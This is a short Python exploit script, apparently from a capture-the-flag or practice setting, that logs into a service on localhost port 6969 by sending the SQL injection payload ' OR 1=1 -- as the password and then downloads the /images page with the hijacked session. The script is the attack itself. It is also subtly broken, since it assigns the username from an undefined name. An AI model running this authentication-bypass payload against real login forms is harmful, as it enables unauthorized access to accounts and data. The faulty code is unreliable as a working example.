#!/usr//bin/python3
import io
import requests


IP = 'http://localhost'
PORT = '6969'

def main():
    sess = requests.Session()
    username = from_attack
    resp = sess.post(
        IP + ":" + PORT + "/login", data={"username": username, "password": "' OR 1=1 --"}
    )
    print(resp.text)
    resp = sess.get(IP + ":" + PORT + "/images")
    print(resp.text)

if __name__ == "__main__":
    main()
